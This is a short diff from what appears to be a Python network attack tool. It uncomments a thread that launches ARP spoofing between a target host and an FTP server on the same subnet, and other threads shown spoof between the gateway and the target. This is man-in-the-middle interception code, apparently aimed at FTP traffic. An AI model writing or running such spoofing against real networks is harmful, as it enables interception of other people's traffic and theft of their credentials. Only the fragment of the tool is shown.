@@ -223,9 +223,8 @@ def main():
 
     # Some logic to determine who to spoof
     if is_same_network(f"{target_ip}/24", f"{ftp_ip}/24"):
-        pass
-        # threading.Thread(target=start_arpspoof,
-        #                  args=(target_ip, ftp_ip)).start()
+        threading.Thread(target=start_arpspoof,
+                         args=(target_ip, ftp_ip)).start()
     threading.Thread(target=start_arpspoof, args=(
         gateway_ip, target_ip)).start()
     threading.Thread(target=start_arpspoof, args=(
